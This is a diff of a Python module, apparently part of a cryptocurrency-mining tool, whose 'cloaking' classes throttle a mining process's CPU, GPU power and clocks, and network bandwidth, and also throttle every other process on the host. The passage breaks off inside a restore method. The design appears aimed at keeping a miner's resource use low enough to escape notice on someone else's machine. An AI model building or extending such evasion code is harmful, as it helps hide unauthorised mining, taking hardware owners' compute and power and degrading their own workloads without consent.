@@ -1,17 +1,26 @@
 # cloak_strategies.py
 
 import os
+import logging
 import subprocess
 import psutil
 import pynvml
-import logging
 import traceback
 from abc import ABC, abstractmethod
 from typing import Dict, Any, List, Tuple, Optional, Type
 
+
+
+
 from .utils import MiningProcess  # Import MiningProcess từ utils.py
-from .cgroup_manager import CgroupManager  # Import CgroupManager từ cgroup_manager.py
-from .resource_control import ResourceControlFactory  # Import ResourceControlFactory từ resource_control.py
+from .resource_control import (
+    CPUResourceManager,
+    GPUResourceManager,
+    NetworkResourceManager,
+    DiskIOResourceManager,
+    CacheResourceManager,
+    MemoryResourceManager
+)
 
 
 class CloakStrategy(ABC):
@@ -20,40 +29,48 @@ class CloakStrategy(ABC):
     """
 
     @abstractmethod
-    def apply(self, process: MiningProcess, cgroups: Dict[str, str]) -> None:
+    def apply(self, process: MiningProcess) -> None:
         """
-        Áp dụng chiến lược cloaking cho tiến trình đã cho trong các cgroup được chỉ định.
+        Áp dụng chiến lược cloaking cho tiến trình đã cho.
 
         Args:
             process (MiningProcess): Đối tượng tiến trình.
-            cgroups (Dict[str, str]): Dictionary chứa tên các cgroup cho các controller
-                                       (ví dụ: {'cpu': 'priority_cpu'}).
         """
         pass
+
+    @abstractmethod
+    def restore(self, process: MiningProcess) -> None:
+        """
+        Khôi phục các thiết lập cloaking cho tiến trình đã cho.
+
+        Args:
+            process (MiningProcess): Đối tượng tiến trình.
+        """
+        pass
+
 
 class CpuCloakStrategy(CloakStrategy):
     """
     Chiến lược cloaking CPU:
-      - Giới hạn sử dụng CPU thông qua cgroups (quota).
+      - Giới hạn sử dụng CPU thông qua việc áp dụng cgroups.
       - Tối ưu hóa việc sử dụng cache CPU.
       - Đặt affinity cho các thread vào các core CPU cụ thể.
+      - Khôi phục các thiết lập ban đầu khi không còn cần cloaking.
+      - Hạn chế CPU sử dụng cho các tiến trình bên ngoài.
+      - Tối ưu hóa scheduling cho các thread.
     """
 
     def __init__(
         self,
         config: Dict[str, Any],
-        logger: logging.Logger,
-        cgroup_manager: CgroupManager,
-        cpu_resource_manager: Any  # Thay bằng loại cụ thể nếu có
+        logger: logging.Logger
     ):
         """
-        Khởi tạo CpuCloakStrategy với cấu hình, logger, CgroupManager và CPUResourceManager.
+        Khởi tạo CpuCloakStrategy với cấu hình và logger.
 
         Args:
             config (Dict[str, Any]): Cấu hình cho chiến lược cloaking CPU.
             logger (logging.Logger): Logger để ghi log.
-            cgroup_manager (CgroupManager): Instance của CgroupManager để thao tác với cgroup.
-            cpu_resource_manager (Any): Instance của CPUResourceManager từ resource_control.py.
         """
         # Lấy cấu hình throttle_percentage với giá trị mặc định là 20%
         self.throttle_percentage = config.get('throttle_percentage', 20)
@@ -61,63 +78,68 @@ class CpuCloakStrategy(CloakStrategy):
             logger.warning("Giá trị throttle_percentage không hợp lệ, mặc định 20%.")
             self.throttle_percentage = 20
 
-        self.logger = logger
-        self.cgroup_manager = cgroup_manager
-        self.cpu_resource_manager = cpu_resource_manager
+        # Lấy cấu hình throttle_external_percentage với giá trị mặc định là 30%
+        self.throttle_external_percentage = config.get('throttle_external_percentage', 30)
+        if not isinstance(self.throttle_external_percentage, (int, float)) or not (0 <= self.throttle_external_percentage <= 100):
+            logger.warning("Giá trị throttle_external_percentage không hợp lệ, mặc định 30%.")
+            self.throttle_external_percentage = 30
 
-    def apply(self, process: MiningProcess, cgroups: Dict[str, str]) -> None:
+        # Lấy danh sách các tiến trình ngoại lai không bị hạn chế (nếu có)
+        self.exempt_pids = config.get('exempt_pids', [])
+
+        # Lấy cấu hình target_cores (core CPU để đặt affinity)
+        self.target_cores = config.get('target_cores', None)  # Nếu None, sử dụng tất cả các core
+
+        # Thêm thuộc tính để lưu trữ tên cgroup của tiến trình mục tiêu
+        self.process_cgroup: Dict[int, str] = {}
+
+        # Khởi tạo các ResourceManager trực tiếp
+        self.cpu_resource_manager = CPUResourceManager(logger)
+
+        self.logger = logger
+
+    def apply(self, process: MiningProcess) -> None:
         """
-        Áp dụng chiến lược cloaking CPU cho tiến trình đã cho trong cgroup đã chỉ định.
+        Áp dụng chiến lược cloaking CPU cho tiến trình đã cho.
 
         Args:
             process (MiningProcess): Đối tượng tiến trình.
-            cgroups (Dict[str, str]): Dictionary chứa tên các cgroup cho các controller.
         """
         try:
             pid, process_name = self.get_process_info(process)
 
-            cpu_cgroup = cgroups.get('cpu')
-            if not cpu_cgroup:
-                self.logger.error(f"Không có cgroup CPU được cung cấp cho tiến trình {process_name} (PID: {pid}).")
+            # Giới hạn sử dụng CPU cho tiến trình mục tiêu bằng cgroups
+            cgroup_name = self.cpu_resource_manager.throttle_cpu_usage(pid, self.throttle_percentage)
+            if cgroup_name:
+                self.process_cgroup[pid] = cgroup_name
+                self.logger.info(f"Giới hạn sử dụng CPU cho tiến trình {process_name} (PID: {pid}) thành công với throttle_percentage={self.throttle_percentage}%.")
+            else:
+                self.logger.error(f"Không thể giới hạn sử dụng CPU cho tiến trình {process_name} (PID: {pid}).")
                 return
 
-            # Tạo cgroup CPU nếu chưa tồn tại
-            if not self.cgroup_manager.cgroup_exists(cpu_cgroup):
-                created = self.cgroup_manager.create_cgroup(cpu_cgroup)
-                if not created:
-                    self.logger.error(f"Không thể tạo cgroup CPU '{cpu_cgroup}' cho tiến trình {process_name} (PID: {pid}).")
-                    return
-
-                # Thêm cgroup CPU vào cgroup cha 'root_cpu'
-                parent_cgroup = "root_cpu"
-                success = self.cgroup_manager.add_cgroup_to_parent(parent_cgroup, cpu_cgroup)
-                if not success:
-                    self.logger.error(f"Không thể thêm cgroup CPU '{cpu_cgroup}' vào cgroup cha '{parent_cgroup}'.")
-                    return
-
-            # Gán tiến trình vào cgroup CPU
-            success = self.cgroup_manager.assign_process_to_cgroup(pid, cpu_cgroup)
-            if success:
-                self.logger.info(f"Gán tiến trình PID={pid} vào cgroup '{cpu_cgroup}' cho CPU.")
+            # Tối ưu hóa việc sử dụng cache
+            success_optimize_cache = self.cpu_resource_manager.optimize_cache_usage(pid)
+            if success_optimize_cache:
+                self.logger.info(f"Tối ưu hóa sử dụng cache cho tiến trình {process_name} (PID: {pid}) thành công.")
             else:
-                self.logger.error(f"Không thể gán tiến trình PID={pid} vào cgroup '{cpu_cgroup}' cho CPU.")
+                self.logger.warning(f"Không thể tối ưu hóa sử dụng cache cho tiến trình {process_name} (PID: {pid}).")
 
-            # Thiết lập CPU quota thông qua CPUResourceManager
-            cpu_quota_us = self.calculate_cpu_quota()
-            success = self.cpu_resource_manager.set_cpu_quota(cpu_cgroup, cpu_quota_us, period=100000)
-            if success:
-                self.logger.info(
-                    f"Đặt CPU quota là {cpu_quota_us}us cho tiến trình {process_name} (PID: {pid}) trong cgroup '{cpu_cgroup}'."
-                )
+            # Đặt CPU affinity
+            success_affinity = self.cpu_resource_manager.optimize_thread_scheduling(pid, self.target_cores)
+            if success_affinity:
+                self.logger.info(f"Tối ưu hóa scheduling cho tiến trình {process_name} (PID: {pid}) thành công.")
             else:
-                self.logger.error(
-                    f"Không thể đặt CPU quota là {cpu_quota_us}us cho tiến trình {process_name} (PID: {pid}) trong cgroup '{cpu_cgroup}'."
-                )
-                return
+                self.logger.warning(f"Không thể tối ưu hóa scheduling cho tiến trình {process_name} (PID: {pid}).")
 
-            # Tối ưu hóa việc sử dụng cache và đặt affinity CPU
-            self.optimize_cache(pid)
-            self.set_thread_affinity(pid, cgroups.get('cpuset'))
+            # Hạn chế CPU cho các tiến trình bên ngoài
+            success_limit_external = self.cpu_resource_manager.limit_cpu_for_external_processes(
+                target_pids=[pid] + self.exempt_pids,
+                throttle_percentage=self.throttle_external_percentage
+            )
+            if success_limit_external:
+                self.logger.info(f"Hạn chế CPU cho các tiến trình bên ngoài thành công với throttle_percentage={self.throttle_external_percentage}%.")
+            else:
+                self.logger.error(f"Không thể hạn chế CPU cho các tiến trình bên ngoài.")
 
         except psutil.NoSuchProcess as e:
             self.logger.error(f"Tiến trình không tồn tại: {e}")
@@ -129,114 +151,47 @@ class CpuCloakStrategy(CloakStrategy):
             )
             raise
 
-    def calculate_cpu_quota(self) -> int:
+    def restore(self, process: MiningProcess) -> None:
         """
-        Tính toán quota CPU dựa trên throttle_percentage.
-
-        Returns:
-            int: CPU quota tính bằng microseconds.
-        """
-        cpu_period_us = 100000  # 100ms
-        total_cores = psutil.cpu_count(logical=True)
-        if total_cores is None:
-            self.logger.error("Không thể xác định số lượng CPU cores.")
-            raise ValueError("Không thể xác định số lượng CPU cores.")
-
-        target_usage_cores = total_cores * (1 - self.throttle_percentage / 100)
-        calculated_quota = int(cpu_period_us * target_usage_cores)
-
-        return calculated_quota
-
-    def optimize_cache(self, pid: int) -> None:
-        """
-        Tối ưu hóa việc sử dụng cache CPU bằng cách đặt độ ưu tiên tiến trình.
+        Khôi phục các thiết lập cloaking CPU cho tiến trình đã cho.
 
         Args:
-            pid (int): PID của tiến trình.
+            process (MiningProcess): Đối tượng tiến trình.
         """
         try:
-            p = psutil.Process(pid)
-            if os.name == 'nt':
-                p.nice(psutil.HIGH_PRIORITY_CLASS)
-            else:
-                p.nice(0)  # Đặt độ ưu tiên mặc định
-            self.logger.info(f"Tối ưu hóa cache cho tiến trình PID {pid} bằng cách đặt độ ưu tiên.")
-        except psutil.NoSuchProcess:
-            self.logger.warning(f"Tiến trình PID {pid} không tồn tại. Không thể tối ưu hóa cache.")
-        except psutil.AccessDenied:
-            self.logger.error(f"Không đủ quyền để tối ưu hóa cache cho PID {pid}.")
-        except Exception as e:
-            self.logger.error(f"Lỗi khi tối ưu hóa cache cho PID {pid}: {e}")
+            pid, process_name = self.get_process_info(process)
 
-    def set_thread_affinity(self, pid: int, cpuset_cgroup: Optional[str], cpu_threads: Optional[List[int]] = None) -> None:
-        """
-        Đặt affinity cho thread của tiến trình bằng cách cấu hình cgroup cpuset.
-
-        Args:
-            pid (int): PID của tiến trình.
-            cpuset_cgroup (Optional[str]): Tên của cgroup cpuset.
-            cpu_threads (Optional[List[int]]): Danh sách các core CPU để đặt affinity.
-        """
-        try:
-            if not cpuset_cgroup:
-                self.logger.error(f"Không có cgroup cpuset được cung cấp cho PID {pid}. Không thể đặt affinity cho thread.")
-                return
-
-            # Lấy danh sách các core CPU có sẵn từ cgroup cpuset
-            cpuset_path = f"/sys/fs/cgroup/cpuset/{cpuset_cgroup}/cpuset.cpus"
-            if not os.path.exists(cpuset_path):
-                self.logger.error(f"Đường dẫn cgroup cpuset {cpuset_path} không tồn tại.")
-                return
-
-            with open(cpuset_path, 'r') as f:
-                cpus = f.read().strip()
-
-            self.logger.debug(f"CPU cores có sẵn cho cgroup '{cpuset_cgroup}': {cpus}")
-
-            # Phân tích chuỗi CPU (ví dụ: "0-3,5") thành danh sách các core số nguyên
-            available_cpus = self.parse_cpus(cpus)
-            if not available_cpus:
-                self.logger.warning(f"Không tìm thấy CPU cores có sẵn trong cgroup cpuset '{cpuset_cgroup}'.")
-                return
-
-            # Nếu có danh sách cpu_threads ban đầu, sử dụng để khôi phục
-            target_cpus = cpu_threads if cpu_threads else available_cpus
-
-            # Đặt CPU affinity cho tiến trình
-            p = psutil.Process(pid)
-            p.cpu_affinity(target_cpus)
-            self.logger.info(
-                f"Đặt CPU affinity cho tiến trình PID {pid} vào các core {target_cpus} trong cgroup '{cpuset_cgroup}'."
-            )
-
-        except psutil.NoSuchProcess:
-            self.logger.warning(f"Tiến trình PID={pid} không tồn tại. Không thể đặt affinity cho thread.")
-        except psutil.AccessDenied:
-            self.logger.error(f"Không đủ quyền để đặt CPU affinity cho PID {pid}.")
-        except Exception as e:
-            self.logger.error(f"Lỗi khi đặt affinity cho thread cho PID {pid}: {e}\n{traceback.format_exc()}")
-
-    def parse_cpus(self, cpus_str: str) -> List[int]:
-        """
-        Phân tích chuỗi CPU từ cpuset.cpus và trả về danh sách các core CPU.
-
-        Args:
-            cpus_str (str): Chuỗi CPU (ví dụ: '0-3,5').
-
-        Returns:
-            List[int]: Danh sách các số core CPU.
-        """
-        cpus = []
-        try:
-            for phần in cpus_str.split(','):
-                if '-' in phần:
-                    bắt_đầu, kết_thúc = phần.split('-')
-                    cpus.extend(range(int(bắt_đầu), int(kết_thúc) + 1))
+            # Khôi phục các thiết lập CPU bằng cách xóa cgroup
+            cgroup_name = self.process_cgroup.get(pid)
+            if cgroup_name:
+                success_restore = self.cpu_resource_manager.restore_cpu_settings(cgroup_name)
+                if success_restore:
+                    self.logger.info(f"Khôi phục các thiết lập CPU cho tiến trình {process_name} (PID: {pid}) thành công.")
                 else:
-                    cpus.append(int(phần))
-        except ValueError as e:
-            self.logger.error(f"Lỗi khi phân tích chuỗi CPUs '{cpus_str}': {e}")
-        return cpus
+                    self.logger.error(f"Không thể khôi phục các thiết lập CPU cho tiến trình {process_name} (PID: {pid}).")
+                del self.process_cgroup[pid]
+            else:
+                self.logger.warning(f"Không tìm thấy cgroup cho PID={pid} khi khôi phục.")
+
+            # Hủy giới hạn CPU cho các tiến trình bên ngoài nếu cần
+            success_unlimit_external = self.cpu_resource_manager.limit_cpu_for_external_processes(
+                target_pids=[pid] + self.exempt_pids,
+                throttle_percentage=0  # Đặt lại throttle_percentage về 0 để không hạn chế
+            )
+            if success_unlimit_external:
+                self.logger.info("Đã hủy giới hạn CPU cho các tiến trình bên ngoài.")
+            else:
+                self.logger.error("Không thể hủy giới hạn CPU cho các tiến trình bên ngoài.")
+
+        except psutil.NoSuchProcess as e:
+            self.logger.error(f"Tiến trình không tồn tại: {e}")
+        except psutil.AccessDenied as e:
+            self.logger.error(f"Không đủ quyền để khôi phục cloaking CPU cho PID {process.pid}: {e}")
+        except Exception as e:
+            self.logger.error(
+                f"Lỗi khi khôi phục cloaking CPU cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
+            )
+            raise
 
     def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
         """
@@ -250,27 +205,27 @@ class CpuCloakStrategy(CloakStrategy):
         """
         return process.pid, process.name
 
+
 class GpuCloakStrategy(CloakStrategy):
     """
     Chiến lược cloaking GPU:
       - Giới hạn power limit của GPU.
       - Tùy chọn điều chỉnh xung nhịp GPU.
       - Giới hạn nhiệt độ của GPU.
+      - Khôi phục các thiết lập ban đầu khi không còn cần cloaking.
     """
 
     def __init__(
         self,
         config: Dict[str, Any],
-        logger: logging.Logger,
-        gpu_resource_manager: Any  # Thay bằng loại cụ thể nếu có
+        logger: logging.Logger
     ):
         """
-        Khởi tạo GpuCloakStrategy với cấu hình, logger và GPUResourceManager.
+        Khởi tạo GpuCloakStrategy với cấu hình và logger.
 
         Args:
             config (Dict[str, Any]): Cấu hình cho chiến lược cloaking GPU.
             logger (logging.Logger): Logger để ghi log.
-            gpu_resource_manager (Any): Instance của GPUResourceManager từ resource_control.py.
         """
         # Lấy cấu hình throttle_percentage với giá trị mặc định là 20%
         self.throttle_percentage = config.get('throttle_percentage', 20)
@@ -280,7 +235,7 @@ class GpuCloakStrategy(CloakStrategy):
 
         # Lấy cấu hình sm_clock và mem_clock với các giá trị mặc định
         self.target_sm_clock = config.get('sm_clock', 1300)   # MHz
-        self.target_mem_clock = config.get('mem_clock', 800) # MHz
+        self.target_mem_clock = config.get('mem_clock', 800)  # MHz
 
         # Lấy cấu hình temperature_threshold với giá trị mặc định là 80°C
         self.temperature_threshold = config.get('temperature_threshold', 80)  # °C
@@ -294,69 +249,88 @@ class GpuCloakStrategy(CloakStrategy):
             logger.warning("Giá trị fan_speed_increase không hợp lệ, mặc định 20%.")
             self.fan_speed_increase = 20
 
-        self.logger = logger
-        self.gpu_resource_manager = gpu_resource_manager
+        # Khởi tạo GPUResourceManager trực tiếp
+        self.gpu_resource_manager = GPUResourceManager(logger, GPUManager())
 
-    def apply(self, process: MiningProcess, cgroups: Dict[str, str]) -> None:
+        self.logger = logger
+
+    def apply(self, process: MiningProcess) -> None:
         """
         Áp dụng chiến lược cloaking GPU cho tiến trình đã cho.
 
         Args:
             process (MiningProcess): Đối tượng tiến trình.
-            cgroups (Dict[str, str]): Dictionary chứa tên các cgroup cho các controller.
         """
         try:
             pid, process_name = self.get_process_info(process)
-            gpu_index = self.assign_gpu(pid)
 
-            if gpu_index == -1:
-                self.logger.warning(
-                    f"Không thể gán GPU cho tiến trình {process_name} (PID: {pid})."
-                )
+            # Gán nhiều GPU cho tiến trình
+            gpu_indices = self.assign_gpus(pid)
+            if not gpu_indices:
+                self.logger.warning(f"Không thể gán GPU cho tiến trình {process_name} (PID: {pid}).")
                 return
 
-            # Thực hiện các hành động cloaking bằng GPUResourceManager
-            # Thiết lập power limit
-            desired_power_limit_w = self.calculate_desired_power_limit(gpu_index)
-            success = self.gpu_resource_manager.set_gpu_power_limit(gpu_index, desired_power_limit_w)
-            if success:
-                self.logger.info(
-                    f"Đặt power limit GPU {gpu_index} thành công lên {desired_power_limit_w}W cho tiến trình {process_name} (PID: {pid})."
-                )
-            else:
-                self.logger.error(
-                    f"Không thể đặt power limit GPU {gpu_index} cho tiến trình {process_name} (PID: {pid})."
-                )
+            for gpu_index in gpu_indices:
+                # Lưu trữ và thiết lập power limit
+                desired_power_limit_w = self.calculate_desired_power_limit(gpu_index)
+                success_power = self.gpu_resource_manager.set_gpu_power_limit(pid, gpu_index, desired_power_limit_w)
+                if success_power:
+                    self.logger.info(f"Đặt power limit GPU {gpu_index} thành công lên {desired_power_limit_w}W cho tiến trình {process_name} (PID: {pid}).")
+                else:
+                    self.logger.error(f"Không thể đặt power limit GPU {gpu_index} cho tiến trình {process_name} (PID: {pid}).")
 
-            # Thiết lập xung nhịp GPU
-            success = self.gpu_resource_manager.set_gpu_clocks(gpu_index, self.target_sm_clock, self.target_mem_clock)
-            if success:
-                self.logger.info(
-                    f"Đặt xung nhịp GPU {gpu_index}: SM={self.target_sm_clock}MHz, MEM={self.target_mem_clock}MHz cho tiến trình {process_name} (PID: {pid})."
-                )
-            else:
-                self.logger.warning(
-                    f"Không thể đặt xung nhịp GPU {gpu_index} cho tiến trình {process_name} (PID: {pid})."
-                )
+                # Lưu trữ và thiết lập xung nhịp GPU
+                success_clocks = self.gpu_resource_manager.set_gpu_clocks(pid, gpu_index, self.target_sm_clock, self.target_mem_clock)
+                if success_clocks:
+                    self.logger.info(f"Đặt xung nhịp GPU {gpu_index}: SM={self.target_sm_clock}MHz, MEM={self.target_mem_clock}MHz cho tiến trình {process_name} (PID: {pid}).")
+                else:
+                    self.logger.warning(f"Không thể đặt xung nhịp GPU {gpu_index} cho tiến trình {process_name} (PID: {pid}).")
 
-            # Giới hạn nhiệt độ GPU
-            success = self.gpu_resource_manager.limit_temperature(
-                gpu_index,
-                self.temperature_threshold,
-                self.fan_speed_increase
-            )
-            if success:
-                self.logger.info(
-                    f"Giới hạn nhiệt độ GPU {gpu_index} thành công cho tiến trình {process_name} (PID: {pid})."
+                # Giới hạn nhiệt độ GPU
+                success_temp = self.gpu_resource_manager.limit_temperature(
+                    gpu_index,
+                    self.temperature_threshold,
+                    self.fan_speed_increase
                 )
-            else:
-                self.logger.warning(
-                    f"Không thể giới hạn nhiệt độ GPU {gpu_index} cho tiến trình {process_name} (PID: {pid})."
-                )
+                if success_temp:
+                    self.logger.info(f"Giới hạn nhiệt độ GPU {gpu_index} thành công cho tiến trình {process_name} (PID: {pid}).")
+                else:
+                    self.logger.warning(f"Không thể giới hạn nhiệt độ GPU {gpu_index} cho tiến trình {process_name} (PID: {pid}).")
 
+        except psutil.NoSuchProcess as e:
+            self.logger.error(f"Tiến trình không tồn tại: {e}")
+        except psutil.AccessDenied as e:
+            self.logger.error(f"Không đủ quyền để áp dụng cloaking GPU cho PID {process.pid}: {e}")
         except Exception as e:
             self.logger.error(
                 f"Lỗi khi áp dụng cloaking GPU cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
+            )
+            raise
+
+    def restore(self, process: MiningProcess) -> None:
+        """
+        Khôi phục các thiết lập cloaking GPU cho tiến trình đã cho.
+
+        Args:
+            process (MiningProcess): Đối tượng tiến trình.
+        """
+        try:
+            pid, process_name = self.get_process_info(process)
+
+            # Khôi phục các thiết lập GPU cho tiến trình
+            success_restore_gpu = self.gpu_resource_manager.restore_resources(pid)
+            if success_restore_gpu:
+                self.logger.info(f"Đã khôi phục tất cả các thiết lập GPU cho tiến trình {process_name} (PID: {pid}).")
+            else:
+                self.logger.error(f"Không thể khôi phục các thiết lập GPU cho tiến trình {process_name} (PID: {pid}).")
+
+        except psutil.NoSuchProcess as e:
+            self.logger.error(f"Tiến trình không tồn tại: {e}")
+        except psutil.AccessDenied as e:
+            self.logger.error(f"Không đủ quyền để khôi phục cloaking GPU cho PID {process.pid}: {e}")
+        except Exception as e:
+            self.logger.error(
+                f"Lỗi khi khôi phục cloaking GPU cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
             )
             raise
 
@@ -370,29 +344,36 @@ class GpuCloakStrategy(CloakStrategy):
         Returns:
             int: Power limit mới tính bằng Watts.
         """
-        power_limit = self.gpu_resource_manager.get_gpu_power_limit(gpu_index)
-        if power_limit is None:
+        current_power_limit = self.gpu_resource_manager.get_gpu_power_limit(gpu_index)
+        if current_power_limit is None:
             self.logger.warning(f"Không thể lấy power limit hiện tại cho GPU {gpu_index}. Sử dụng giá trị mặc định.")
-            power_limit = 100  # Giá trị mặc định nếu không thể lấy
+            current_power_limit = 100  # Giá trị mặc định nếu không thể lấy
 
-        desired_power_limit_w = int(round(power_limit * (1 - self.throttle_percentage / 100)))
-        self.logger.debug(f"Tính toán power limit mới cho GPU {gpu_index}: {desired_power_limit_w}W")
+        desired_power_limit_w = int(round(current_power_limit * (1 - self.throttle_percentage / 100)))
+        self.logger.debug(f"Tính toán power limit mới cho GPU {gpu_index}: {desired_power_limit_w}W.")
         return desired_power_limit_w
 
-    def assign_gpu(self, pid: int) -> int:
+    def assign_gpus(self, pid: int) -> List[int]:
         """
-        Gán GPU cho tiến trình dựa trên PID.
+        Gán nhiều GPU cho tiến trình dựa trên PID.
 
         Args:
             pid (int): PID của tiến trình.
 
         Returns:
-            int: Chỉ số GPU được gán hoặc -1 nếu không thể gán.
+            List[int]: Danh sách chỉ số GPU được gán hoặc trống nếu không thể gán.
         """
         gpu_count = self.gpu_resource_manager.gpu_manager.gpu_count
         if gpu_count <= 0:
-            return -1
-        return pid % gpu_count
+            self.logger.warning("Không có GPU nào để gán.")
+            return []
+
+        # Ví dụ: Gán tất cả các GPU theo một chiến lược vòng quay dựa trên PID
+        # Bạn có thể thay đổi chiến lược này theo nhu cầu
+        # Ở đây, chúng ta gán tất cả các GPU
+        assigned_gpus = list(range(gpu_count))
+        self.logger.debug(f"Đã gán các GPU {assigned_gpus} cho PID {pid}.")
+        return assigned_gpus
 
     def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
         """
@@ -406,27 +387,25 @@ class GpuCloakStrategy(CloakStrategy):
         """
         return process.pid, process.name
 
+
 class NetworkCloakStrategy(CloakStrategy):
     """
     Chiến lược cloaking mạng:
       - Giảm băng thông mạng cho tiến trình.
+      - Khôi phục các thiết lập ban đầu khi không còn cần cloaking.
     """
 
     def __init__(
         self,
         config: Dict[str, Any],
-        logger: logging.Logger,
-        cgroup_manager: CgroupManager,
-        network_resource_manager: Any  # Thay bằng loại cụ thể nếu có
+        logger: logging.Logger
     ):
         """
-        Khởi tạo NetworkCloakStrategy với cấu hình, logger, CgroupManager và NetworkResourceManager.
+        Khởi tạo NetworkCloakStrategy với cấu hình và logger.
 
         Args:
             config (Dict[str, Any]): Cấu hình cho chiến lược cloaking Network.
             logger (logging.Logger): Logger để ghi log.
-            cgroup_manager (CgroupManager): Instance của CgroupManager để thao tác với cgroup.
-            network_resource_manager (Any): Instance của NetworkResourceManager từ resource_control.py.
         """
         # Lấy cấu hình bandwidth_reduction_mbps với giá trị mặc định là 10Mbps
         self.bandwidth_reduction_mbps = config.get('bandwidth_reduction_mbps', 10)
@@ -437,8 +416,9 @@ class NetworkCloakStrategy(CloakStrategy):
         # Lấy cấu hình network_interface hoặc tự động xác định
         self.network_interface = config.get('network_interface')
         self.logger = logger
-        self.cgroup_manager = cgroup_manager
-        self.network_resource_manager = network_resource_manager
+
+        # Khởi tạo NetworkResourceManager trực tiếp
+        self.network_resource_manager = NetworkResourceManager(logger)
 
         if not self.network_interface:
             self.network_interface = self.get_primary_network_interface()
@@ -447,13 +427,15 @@ class NetworkCloakStrategy(CloakStrategy):
                 self.network_interface = "eth0"
             self.logger.info(f"Giao diện mạng chính xác định: {self.network_interface}")
 
-    def apply(self, process: MiningProcess, cgroups: Dict[str, str]) -> None:
+        # Thêm thuộc tính để lưu trữ fwmark cho tiến trình
+        self.process_marks: Dict[int, int] = {}
+
+    def apply(self, process: MiningProcess) -> None:
         """
-        Áp dụng chiến lược cloaking mạng cho tiến trình đã cho trong cgroup đã chỉ định.
+        Áp dụng chiến lược cloaking mạng cho tiến trình đã cho.
 
         Args:
             process (MiningProcess): Đối tượng tiến trình.
-            cgroups (Dict[str, str]): Dictionary chứa tên các cgroup cho các controller.
         """
         try:
             pid, process_name = self.get_process_info(process)
@@ -462,74 +444,24 @@ class NetworkCloakStrategy(CloakStrategy):
             mark = pid % 32768  # fwmark phải < 65536
             self.logger.debug(f"Đặt fwmark={mark} cho tiến trình PID={pid}.")
 
-            # Thêm quy tắc iptables để đánh dấu các gói tin từ PID này thông qua NetworkResourceManager
-            success = self.network_resource_manager.mark_packets(pid, mark)
-            if not success:
-                self.logger.error(
-                    f"Không thể thêm iptables MARK cho tiến trình {process_name} (PID: {pid}) với mark={mark}."
-                )
+            # Thêm quy tắc iptables để đánh dấu các gói tin từ PID này
+            success_mark = self.network_resource_manager.mark_packets(pid, mark)
+            if not success_mark:
+                self.logger.error(f"Không thể thêm iptables MARK cho tiến trình {process_name} (PID: {pid}) với mark={mark}.")
                 return
 
             # Thiết lập băng thông mạng thông qua NetworkResourceManager
-            success = self.network_resource_manager.limit_bandwidth(
+            success_limit = self.network_resource_manager.limit_bandwidth(
                 self.network_interface,
                 mark,
                 self.bandwidth_reduction_mbps
             )
-            if not success:
-                self.logger.error(
-                    f"Không thể giới hạn băng thông mạng cho tiến trình {process_name} (PID: {pid}) với mark={mark} trên giao diện '{self.network_interface}'."
-                )
+            if not success_limit:
+                self.logger.error(f"Không thể giới hạn băng thông mạng cho tiến trình {process_name} (PID: {pid}) với mark={mark} trên giao diện '{self.network_interface}'.")
                 return
 
-            # Gán tiến trình vào cgroup Network
-            network_cgroup = cgroups.get('network')
-            if network_cgroup:
-                try:
-                    # Tạo cgroup Network nếu chưa tồn tại
-                    if not self.cgroup_manager.cgroup_exists(network_cgroup):
-                        created = self.cgroup_manager.create_cgroup(network_cgroup)
-                        if not created:
-                            self.logger.error(f"Không thể tạo cgroup Network '{network_cgroup}' cho tiến trình {process_name} (PID: {pid}).")
-                            return
-
-                        # Thêm cgroup Network vào cgroup cha 'root_network'
-                        parent_cgroup = "root_network"
-                        success = self.cgroup_manager.add_cgroup_to_parent(parent_cgroup, network_cgroup)
-                        if not success:
-                            self.logger.error(f"Không thể thêm cgroup Network '{network_cgroup}' vào cgroup cha '{parent_cgroup}'.")
-                            return
-
-                    # Thiết lập các tham số mạng thông qua NetworkResourceManager
-                    classid_value = mark
-                    success = self.network_resource_manager.set_classid(network_cgroup, classid_value)
-                    if success:
-                        self.logger.info(
-                            f"Đặt 'net_cls.classid' là {classid_value} cho cgroup Network '{network_cgroup}'."
-                        )
-                    else:
-                        self.logger.error(
-                            f"Không thể đặt 'net_cls.classid' cho cgroup Network '{network_cgroup}'."
-                        )
-
-                    # Gán tiến trình vào cgroup Network
-                    success = self.cgroup_manager.assign_process_to_cgroup(pid, network_cgroup)
-                    if success:
-                        self.logger.info(f"Gán tiến trình PID={pid} vào cgroup '{network_cgroup}' cho Network.")
-                    else:
-                        self.logger.error(f"Không thể gán tiến trình PID={pid} vào cgroup '{network_cgroup}' cho Network.")
-
-                except psutil.NoSuchProcess as e:
-                    self.logger.error(f"Tiến trình PID={pid} không tồn tại khi thao tác với cgroup Network: {e}")
-                except psutil.AccessDenied as e:
-                    self.logger.error(f"Không đủ quyền để thao tác với cgroup Network cho PID {pid}: {e}")
-                except Exception as e:
-                    self.logger.error(
-                        f"Lỗi khi thao tác với cgroup Network '{network_cgroup}' cho tiến trình {process_name} (PID: {pid}): {e}"
-                    )
-                    raise
-            else:
-                self.logger.warning(f"Không có cgroup Network được cung cấp cho tiến trình {process_name} (PID: {pid}).")
+            # Lưu trữ mark để khôi phục sau này
+            self.process_marks[pid] = mark
 
             self.logger.info(
                 f"Áp dụng cloaking mạng cho tiến trình {process_name} (PID: {pid}): "
@@ -543,6 +475,52 @@ class NetworkCloakStrategy(CloakStrategy):
         except Exception as e:
             self.logger.error(
                 f"Lỗi khi áp dụng cloaking mạng cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
+            )
+            raise
+
+    def restore(self, process: MiningProcess) -> None:
+        """
+        Khôi phục các thiết lập cloaking mạng cho tiến trình đã cho.
+
+        Args:
+            process (MiningProcess): Đối tượng tiến trình.
+        """
+        try:
+            pid, process_name = self.get_process_info(process)
+
+            # Lấy fwmark đã lưu trữ
+            mark = self.process_marks.get(pid)
+            if mark is None:
+                self.logger.warning(f"Không tìm thấy fwmark cho PID={pid} khi khôi phục.")
+                return
+
+            # Xóa giới hạn băng thông mạng
+            success_remove = self.network_resource_manager.remove_bandwidth_limit(
+                self.network_interface,
+                mark
+            )
+            if success_remove:
+                self.logger.info(f"Khôi phục giới hạn băng thông mạng cho tiến trình {process_name} (PID: {pid}) thành công.")
+            else:
